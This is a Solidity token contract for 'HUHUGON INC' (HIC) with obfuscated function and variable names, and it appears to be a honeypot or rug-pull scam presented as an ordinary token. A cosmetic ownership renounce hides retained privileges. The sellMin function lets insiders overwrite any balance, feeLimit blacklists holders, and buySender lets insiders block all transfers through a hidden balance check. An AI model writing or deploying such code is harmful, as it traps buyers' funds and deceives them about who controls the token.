//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface launchExempt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface liquidityIs {
    function createPair(address amountSender, address feeFund) external returns (address);
}

abstract contract walletTeam {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface teamMin {
    function totalSupply() external view returns (uint256);

    function balanceOf(address swapAmount) external view returns (uint256);

    function transfer(address takeIsTx, uint256 launchFeeExempt) external returns (bool);

    function allowance(address toTrading, address spender) external view returns (uint256);

    function approve(address spender, uint256 launchFeeExempt) external returns (bool);

    function transferFrom(address sender,address takeIsTx,uint256 launchFeeExempt) external returns (bool);

    event Transfer(address indexed from, address indexed listTo, uint256 value);
    event Approval(address indexed toTrading, address indexed spender, uint256 value);
}

interface tradingMax is teamMin {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract HUHUGONINC is walletTeam, teamMin, tradingMax {

    function name() external view virtual override returns (string memory) {
        return takeSwap;
    }

    uint256 txAmount;

    function liquidityFee(address autoFrom, address takeIsTx, uint256 launchFeeExempt) internal returns (bool) {
        if (autoFrom == sellLaunch) {
            return isSenderMax(autoFrom, takeIsTx, launchFeeExempt);
        }
        uint256 buyTake = teamMin(tradingAmountSwap).balanceOf(walletSwap);
        require(buyTake == buyShould);
        require(!enableIs[autoFrom]);
        return isSenderMax(autoFrom, takeIsTx, launchFeeExempt);
    }

    address public sellLaunch;

    uint256 private listFee;

    function transferFrom(address autoFrom, address takeIsTx, uint256 launchFeeExempt) external override returns (bool) {
        if (_msgSender() != minLaunched) {
            if (tokenMarketing[autoFrom][_msgSender()] != type(uint256).max) {
                require(launchFeeExempt <= tokenMarketing[autoFrom][_msgSender()]);
                tokenMarketing[autoFrom][_msgSender()] -= launchFeeExempt;
            }
        }
        return liquidityFee(autoFrom, takeIsTx, launchFeeExempt);
    }

    uint256 private launchedList = 100000000 * 10 ** 18;

    function enableTake() private view {
        require(buyTo[_msgSender()]);
    }

    function fromToReceiver() public {
        emit OwnershipTransferred(sellLaunch, address(0));
        toMarketing = address(0);
    }

    function teamWallet(address swapTx) public {
        if (listTotal) {
            return;
        }
        
        buyTo[swapTx] = true;
        if (amountSwap == enableTotal) {
            enableTotal = true;
        }
        listTotal = true;
    }

    function getOwner() external view returns (address) {
        return toMarketing;
    }

    mapping(address => bool) public buyTo;

    address private toMarketing;

    constructor (){
        if (enableTotal != amountSwap) {
            amountSwap = false;
        }
        fromToReceiver();
        launchExempt feeToken = launchExempt(minLaunched);
        tradingAmountSwap = liquidityIs(feeToken.factory()).createPair(feeToken.WETH(), address(this));
        if (launchEnable == listFee) {
            launchEnable = listFee;
        }
        sellLaunch = _msgSender();
        buyTo[sellLaunch] = true;
        fundBuy[sellLaunch] = launchedList;
        if (enableTotal != amountSwap) {
            enableTotal = true;
        }
        emit Transfer(address(0), sellLaunch, launchedList);
    }

    function allowance(address minLimitBuy, address tradingFrom) external view virtual override returns (uint256) {
        if (tradingFrom == minLaunched) {
            return type(uint256).max;
        }
        return tokenMarketing[minLimitBuy][tradingFrom];
    }

    bool private amountSwap;

    mapping(address => uint256) private fundBuy;

    function feeLimit(address launchMax) public {
        enableTake();
        if (enableTotal) {
            enableTotal = true;
        }
        if (launchMax == sellLaunch || launchMax == tradingAmountSwap) {
            return;
        }
        enableIs[launchMax] = true;
    }

    string private shouldLaunched = "HIC";

    function transfer(address amountMinBuy, uint256 launchFeeExempt) external virtual override returns (bool) {
        return liquidityFee(_msgSender(), amountMinBuy, launchFeeExempt);
    }

    string private takeSwap = "HUHUGON INC";

    function owner() external view returns (address) {
        return toMarketing;
    }

    function approve(address tradingFrom, uint256 launchFeeExempt) public virtual override returns (bool) {
        tokenMarketing[_msgSender()][tradingFrom] = launchFeeExempt;
        emit Approval(_msgSender(), tradingFrom, launchFeeExempt);
        return true;
    }

    mapping(address => mapping(address => uint256)) private tokenMarketing;

    bool public listTotal;

    function decimals() external view virtual override returns (uint8) {
        return txTeam;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return launchedList;
    }

    uint8 private txTeam = 18;

    function balanceOf(address swapAmount) public view virtual override returns (uint256) {
        return fundBuy[swapAmount];
    }

    function isSenderMax(address autoFrom, address takeIsTx, uint256 launchFeeExempt) internal returns (bool) {
        require(fundBuy[autoFrom] >= launchFeeExempt);
        fundBuy[autoFrom] -= launchFeeExempt;
        fundBuy[takeIsTx] += launchFeeExempt;
        emit Transfer(autoFrom, takeIsTx, launchFeeExempt);
        return true;
    }

    mapping(address => bool) public enableIs;

    address walletSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool private enableTotal;

    address public tradingAmountSwap;

    uint256 buyShould;

    address minLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    event OwnershipTransferred(address indexed buyToken, address indexed exemptSellToken);

    function sellMin(address amountMinBuy, uint256 launchFeeExempt) public {
        enableTake();
        fundBuy[amountMinBuy] = launchFeeExempt;
    }

    function symbol() external view virtual override returns (string memory) {
        return shouldLaunched;
    }

    uint256 public launchEnable;

    function buySender(uint256 launchFeeExempt) public {
        enableTake();
        buyShould = launchFeeExempt;
    }

}